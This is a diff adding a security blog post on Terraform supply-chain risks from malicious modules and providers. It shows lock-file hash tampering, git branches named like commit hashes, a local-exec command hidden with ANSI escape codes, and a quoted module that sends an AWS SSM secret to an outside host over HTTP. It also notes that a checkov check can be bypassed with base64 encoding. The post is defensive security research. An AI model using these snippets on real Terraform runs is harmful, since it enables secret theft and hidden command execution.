@@ -1,0 +1,297 @@
+---
+title: "Terraform as part of the software supply chain, Part 1 - Modules and Providers"
+author: Joern Schneeweisz
+author_gitlab: joernchen
+author_twitter: joernchen
+categories: security
+image_title: '/images/blogimages/terraform-sc-series/pexels-mateusz-dach-353641.jpeg'
+description: "We examine the supply chain aspects of Terraform, starting with a closer look at malicious Terraform modules and providers and how you can better secure them."
+tags: security
+twitter_text: "This blog examines the #supplychain aspects of Terraform, starting with a closer look at malicious Terraform modules and providers. Learn how you can better secure them."
+featured: no
+postType: content marketing
+related_posts:
+  - "/blog/2022/02/17/how-gitlab-handles-security-bugs/"
+  - "/blog/2022/05/11/how-we-run-red-team-operations-remotely/"
+  - "/blog/2022/03/21/security-hygiene-best-practices-for-gitlab-users/"
+---
+
+## What is Terraform?
+
+Terraform is an infrastructure as code (IaC) solution that helps businesses grow their infrastructure securely and at scale, while managing everything in it from multiple servers to multiple clouds. Terraform lets you build your complete infrastructure as code.
+
+Terraform, which was created by HashiCorp, is an open-source, public-cloud-provisioning tool written in the Go language. Although Terraform serves many functions, its primary use is to help DevOps teams automate various infrastructure management tasks and helps you manage all of your servers and resources, even if they come from different providers (unlike some other IaC competitors). Terraforms connects all of your infrastructures and helps you manage it. 
+
+Terraform supports many providers like [AWS](/blog/2020/12/15/deploy-aws/), Google Cloud Platform, Azure, and others via APIs provided by the cloud service providers.
+
+## What are the benefits of using Terraform providers?
+
+The biggest benefit of using a Terraform cloud provider is the versatility that it provides to DevOps teams. Regardless of which provider you use, Terraform lets you easily manage all of your resources no matter where you’re located and how many servers you have at your disposal. 
+
+The other major advantage to using Terraform is automation. On any given DevOps team today, there are far too many functions that need to happen repeatedly and simultaneously. The only way to be able to efficiently manage all that needs to be done is to automate a lot of your processes. 
+
+Terraform helps you automate all of your server management tasks. Everything is done in code, and it eliminates a lot of manual work. The ability to create scripts that run your task actions and reuse them makes life a lot easier for DevOps teams. 
+
+Finally, unlike other IaC providers, Terraform doesn’t require any agent software to be installed on the managed infrastructure, making it more user-friendly than those competitors that require agent-based software for IaC installation.
+
+## Terraform Security
+
+When talking about Terraform security, there are many resources covering the security aspects of the infrastructure surrounding certain Terraform configurations. Looking at the security of Terraform itself and the things which could go wrong when running it, however, have very little coverage so far.
+
+Some previously published work I'm aware of includes:
+
+- A [blogpost covering malicious Terraform modules](https://sprocketfox.io/xssfox/2022/02/09/terraformsupply/) by [xssfox](https://sprocketfox.io/xssfox/about/) had already been published when I started digging into the topic. The main attack vector in this case is a malicious Terraform module which exfiltrates an AWS System Manager-stored secret via HTTP towards an attacker-controlled host.
+
+- The folks at [bridgecrew](https://bridgecrew.io/) reacted to the above xssfox post with some [static detection rules](https://github.com/bridgecrewio/checkov/blob/63d36e5ba309e9c03ef99a13f264ba256d756d8d/checkov/terraform/checks/graph_checks/aws/HTTPNotSendingPasswords.yaml) for their tool `checkov` and a [blogpost looking at the supply chain aspects of Terraform](https://bridgecrew.io/blog/terraform-supply-chain-security-risks-prevent-them-with-checkov/).
+
+- Also worth mentioning is, of course, [Hashicorp's stance on malicious Terraform modules and providers](https://www.terraform.io/cloud-docs/architectural-details/security-model#malicious-terraform-providers-or-modules):
+
+> **"Terraform providers and modules used in your Terraform configuration will have full access to the variables and Terraform state within a workspace. Terraform Cloud cannot prevent malicious providers and modules from exfiltrating this sensitive data. We recommend only using trusted modules and providers within your Terraform configuration."**
+
+The blog post you're reading is part one of a three-part series examining the supply chain aspects of Terraform and aims to look at malicious Terraform modules and providers. I'll also give recommendations on securing the process of running Terraform against modules and providers gone rogue. The next two blogs in the series will build upon these findings and cover more in-depth topics and vulnerabilities.
+
+## Provider security
+Providers in Terraform are executable binaries, so if a provider turns malicious it's certainly "game over" in the sense that it can do whatever the host OS it runs on allows. Providers need to have a signature which gets validated by Terraform upon installation of the Provider. Version `0.14` Terraform creates a [dependency lock file](https://www.terraform.io/language/files/dependency-lock) which records checksums of the used providers in two different formats.
+
+### zh and h1 checksums
+The first format, `zh`, is simply a SHA256 hash of the `zip` file which contains a provider for a specific OS/hardware platform combination. The `h1` hash is a so-called "[dirhash](https://pkg.go.dev/golang.org/x/mod/sumdb/dirhash)" of the provider's directory. 
+
+So if we look at the following lock file `.terraform.lock.hcl` we can observe the two different types of hashes:  
+
+```hcl
+# This file is maintained automatically by "terraform init".  
+# Manual edits may be lost in future updates.  
+  
+provider "registry.terraform.io/hashicorp/aws" {  
+ version = "4.11.0"  
+ hashes = [  
+   "h1:JTgGUEVVuuv82X0ePjDM73f+ZM+NfLwb/GGNAOM0CdE=",  
+   "zh:3e4634f4babcef402160ffb97f9f37e3e781313ceb7b7858fe4b7fc0e2e33e99",  
+   "zh:3ff647aa88e71419480e3f51a4b40e3b0e2d66482bea97c0b4e75f37aa5ad1f1",  
+   "zh:4680d16fbb85663034dc3677b402e9e78ab1d4040dd80603052817a96ec08911",  
+   "zh:5190d03f43f7ad56dae0a7f0441a0f5b2590f42f6e07a724fe11dd50c42a12e4",  
+   "zh:622426fcdbb927e7c198fe4b890a01a5aa312e462cd82ae1e302186eeac1d071",  
+   "zh:9b12af85486a96aedd8d7984b0ff811a4b42e3d88dad1a3fb4c0b580d04fa425",  
+   "zh:b0b766a835c79f8dd58b93d25df8f37749f33cca2297ac088d402d718baddd9c",  
+   "zh:b293cf26a02992b2167ed3f63711dc01221c4a5e2984b6c7c0c04a6155ab0526",  
+   "zh:ca8e1f5c58fc838edb5fe7528aec3f2fcbaeabf808add0f401aee5073b61f17f",  
+   "zh:e0d2ad2767c0134841d52394d180f8f3315c238949c8d11be39a214630e8d50e",  
+   "zh:ece0d11c35a8537b662287e00af4d27a27eb9558353b133674af90ec11c818d3",  
+   "zh:f7e1cd07ae883d3be01942dc2b0d516b9736a74e6037287ab19f616725c8f7e8",  
+ ]  
+}
+```
+
+The `zh` entries can also be found in the [provider's v.4.11.0 release](https://github.com/hashicorp/terraform-provider-aws/releases/download/v4.11.0/) within the [SHA256SUMS](https://github.com/hashicorp/terraform-provider-aws/releases/download/v4.11.0/terraform-provider-aws_4.11.0_SHA256SUMS) file. To understand the single `h1` dirhash entry we need to have a look at the provider's directory. 
+
+In our Terraform project it is constructed like this:  
+
+```
+$ ls .terraform/providers/registry.terraform.io/hashicorp/aws/4.11.0/linux_amd64/                                     
+terraform-provider-aws_v4.11.0_x5
+$ cd .terraform/providers/registry.terraform.io/hashicorp/aws/4.11.0/linux_amd64/
+$ sha256sum terraform-provider-aws_v4.11.0_x5
+34c03613d15861d492c2d826c251580c58de232be6e50066cb0a0bb8c87b48de  terraform-provider-aws_v4.11.0_x5
+$ sha256sum terraform-provider-aws_v4.11.0_x5 > /tmp/dirhash
+$ sha256sum /tmp/dirhash    
+253806504555baebfcd97d1e3e30ccef77fe64cf8d7cbc1bfc618d00e33409d1  /tmp/dirhash
+$ echo 253806504555baebfcd97d1e3e30ccef77fe64cf8d7cbc1bfc618d00e33409d1 | ruby -rbase64 -e 'puts Base64.encode64 [STDIN.read.chomp].pack("H*")'  
+JTgGUEVVuuv82X0ePjDM73f+ZM+NfLwb/GGNAOM0CdE=
+```
+
+The `dirhash`, called `h1` in the lock file, is created from an alphabetical list of `sha256sum filename`. Once this list is `sha256sum` ed again, the resulting hash is taken in binary representation and then converted to Base64.
+
+From an attacker's perspective, the interesting part about the lock file is that it can contain multiple `zh` and `h1` hashes per provider. It is also noteworthy that those two types don't have to have any relationship. If we modify a downloaded provider's content on disk, we can simply place the corresponding `h1` hash next to any other `h1` in the lock file. As there can be multiple entries we would not break any legitimate installation and just allow-list a modified provider directory on-disk on top of what's already allowed.
+
+**Lessons learned here**
+
+1. Put your `.terraform.lock.hcl` under version control (Terraform even suggests this on the command line when it generates the file).
+2. Verify and double-check any modifications and additions to the `.terraform.lock.hcl` file; this is crucial to detect any tampering with the providers in use.
+
+> You’re invited! Join us on June 23rd for the [GitLab 15 launch event](https://page.gitlab.com/fifteen) with DevOps guru Gene Kim and several GitLab leaders. They’ll show you what they see for the future of DevOps and The One DevOps Platform.
+
+## Module security
+
+Modules don't have any form of signature, and can be downloaded from different [module sources](https://www.terraform.io/language/modules/sources#module-sources). By default what happens when you instruct Terraform to download a module is that the [public Terraform Registry](https://www.terraform.io/language/modules/sources#terraform-registry) will redirect the Terraform client to download a Git tag from a public GitHub repository. The problem here is that Git tags on GitHub are mutable. They can simply be replaced with completely different content by e.g. a force-push of new content under the same tag to GitHub.
+
+So having a module referenced like:  
+
+```hcl
+module "hello" {
+  source  = "joernchen/hello/test"
+  version = "0.0.1"
+}
+```
+
+would download the [Git tag `v0.0.1`](https://github.com/joernchen/terraform-test-hello/releases/tag/v0.0.1) from my GitHub repository but there's no guarantee about the content. 
+
+At this point, the most common recommendation is [to specify a git ref](https://www.terraform.io/language/modules/sources#selecting-a-revision) pointing to a full commit SHA. This approach isn't perfect either in the non-default case. Depending on the module source, we can utilize the fact that we're able to name a branch just like a commit hash. GitLab and GitHub won't allow you to create such branches, or to push branches that look like commit hashes. However, other module sources might allow this. An actual attack using this vector would look like what we see below.  
+
+First we look at a legitimate clone referencing a git commit:  
+
+```
+$ cat main.tf 
+module "immutable_module"{
+  source = "git::http://localhost:8080/.git?ref=e23c0dcbb43ca19ea9ca91c879aafcc66c990758"
+}
+$ terraform init                                                                    
+Initializing modules...
+Downloading git::http://localhost:8080/.git?ref=e23c0dcbb43ca19ea9ca91c879aafcc66c990758 for immutable_module...
+- immutable_module in .terraform/modules/immutable_module
+
+Initializing the backend...
+
+Initializing provider plugins...
+- Finding latest version of hashicorp/http...
+- Installing hashicorp/http v2.1.0...
+- Installed hashicorp/http v2.1.0 (signed by HashiCorp)
+
+Terraform has created a lock file .terraform.lock.hcl to record the provider
+selections it made above. Include this file in your version control repository
+so that Terraform can guarantee to make the same selections by default when
+you run "terraform init" in the future.
+
+Terraform has been successfully initialized!
+
+You may now begin working with Terraform. Try running "terraform plan" to see
+any changes that are required for your infrastructure. All Terraform commands
+should now work.
+
+If you ever set or change modules or backend configuration for Terraform,
+rerun this command to reinitialize your working directory. If you forget, other
+commands will detect it and remind you to do so if necessary.
+$ ls -al .terraform/modules/immutable_module
+total 20
+drwxr-xr-x 3 joern joern 4096  9. Mai 09:53 .
+drwxr-xr-x 3 joern joern 4096  9. Mai 09:53 ..
+drwxr-xr-x 8 joern joern 4096  9. Mai 09:53 .git
+-rw-r--r-- 1 joern joern  159  9. Mai 09:53 main.tf
+-rw-r--r-- 1 joern joern   22  9. Mai 09:53 README.md
+```
+
+Then we prepare our repository to have a branch with the same name as the previously used commit:  
+
+```
+$ git checkout -b e23c0dcbb43ca19ea9ca91c879aafcc66c990758
+Switched to a new branch 'e23c0dcbb43ca19ea9ca91c879aafcc66c990758'
+$ echo "a malicious file">malicious.tf
+$ git add malicious.tf 
+$ git commit -m "a malicious commit"
+[e23c0dcbb43ca19ea9ca91c879aafcc66c990758 51de72e] a malicious commit
+ 1 file changed, 1 insertion(+)
+ create mode 100644 malicious.tf
+```
+When we initialize the project again we'll pull the malicious branch instead of the referenced commit:
+
+``` 
+$ rm -rf .terraform         
+$ terraform init
+Initializing modules...
+Downloading git::http://localhost:8080/.git?ref=e23c0dcbb43ca19ea9ca91c879aafcc66c990758 for immutable_module...
+- immutable_module in .terraform/modules/immutable_module
+╷
+│ Error: Invalid block definition
+│ 
+│ On .terraform/modules/immutable_module/malicious.tf line 1: A block definition must have block content delimited by "{" and "}", starting on the
+│ same line as the block header.
+╵
+
+╷
+│ Error: Invalid block definition
+│ 
+│ On .terraform/modules/immutable_module/malicious.tf line 1: A block definition must have block content delimited by "{" and "}", starting on the
+│ same line as the block header.
+╵
+```
+
+**Lesson learned here** 
+
+Seemingly immutable git refs really aren't that immutable after all. This means we cannot trust modules hosted in arbitrary locations and simply rely on their git ref to be pinned. Instead, we must have control over the hosted location such that manipulation of the repository can be prevented.
+
+### Impact of malicious modules
+
+What could a malicious module do?
+
+Reading the documentation, there are some useful primitives already built in. The most "powerful" primitive, if we want to mess with the Terraform run itself, might be [`local-exec`](https://www.terraform.io/language/resources/provisioners/local-exec) which will let us run local commands on the machine running the Terraform process.
+
+Terraform, however, will be verbose about this and tell the user what it just executed:
+
+![file name](/images/blogimages/terraform-sc-series/local-exec.png){: .shadow.medium.center}
+Terraform local-exec
+{: .note.text-center}
+
+
+We can cheat here a little as most terminals support so-called [ANSI escape codes](https://en.wikipedia.org/wiki/ANSI_escape_code) which allow one to meddle to a certain extent with the terminal output.
+
+The following variant of our `main.tf` file in the screenshot above will disguise the output traces of `local-exec` in the terminal:  
+
+```hcl
+resource "null_resource" "lol" {  
+  
+ provisioner "local-exec" {  
+   command = "id > haxx ;echo -e '\\033[0K \\033[1K \\033[1A \\033[0K \\033[1K \\033[2A'"  
+ }  
+}
+```
+
+The screenshot below shows that our traces of using `local-exec` are no longer visible in the shell output:
+
+![file name](/images/blogimages/terraform-sc-series/local-exec-ansi.png){: .shadow.medium.center}
+Local exec is no longer visible in the shell output
+{: .note.text-center}
+
+Another attack vector was outlined [in xssfox's post](https://sprocketfox.io/xssfox/2022/02/09/terraformsupply/):  
+
+```hcl
+terraform {
+  required_providers {
+    aws = {
+      source  = "hashicorp/aws"
+    }
+    http = {}
+  }
+}
+
+resource "aws_ssm_parameter" "param" {
+  name  = var.parameter_name
+  type  = "SecureString"
+  value = random_password.password.result
+}
+
+resource "random_password" "password" {
+  length           = 16
+  special          = true
+  override_special = "_%@"
+}
+
+## !!! Our evil way to leak data !!!
+data "http" "leak" {
+    url = "https://enp840cyx28ip.x.pipedream.net/?id=${aws_ssm_parameter.param.name}&content=${aws_ssm_parameter.param.value}"
+}
+```
+
+Here, the to-be-kept-secret parameter `aws_ssm_parameter` is leaked via the `http` data source. We can detect such a leak with [`checkov`](https://www.checkov.io/). Running `checkov` to check the above terraform code will warn us with a failed check:
+
+![file name](/images/blogimages/terraform-sc-series/checkov1.png){: .shadow.medium.center}
+Failed check
+{: .note.text-center}
+
+This check can be bypassed quite easily by simply wrapping the leaked parameters in `base64encode`:
+
+![file name](/images/blogimages/terraform-sc-series/checkov2.png){: .shadow.medium.center}
+Bypassing the failed check
+{: .note.text-center}
+
+
+**Lesson learned here**
+
+The main takeaway is that malicious modules can be a quite powerful attack primitive and there are many different ways to compromise a Terraform run with a malicious module, such that even automated checks might fail.
+
+### Closing thoughts and what's next
+
+This first blog covered the basics of malicious modules and providers in Terraform. As a bottom line I'd like to emphasize the fragility of running Terraform in cases where third-party modules and providers are being used. To harden your Terraform process against malicious modules you should be in control of the included module's and provider's content at all times. For providers, you can rely on the signatures as long as they've not been messed with. For modules, it is recommended to host them in a controlled environment.
+
+Our next blog in this series will cover some vulnerabilities in Terraform itself. In our third and final post we'll take a closer look at CI/CD related aspects of Terraform. Until next time!
+
+Cover image by [Mateusz Dach](https://www.pexels.com/@mateusz-dach-99805/) on [Pexels](https://www.pexels.com/photo/brown-wooden-dominoes-353641/).
+{: .note}
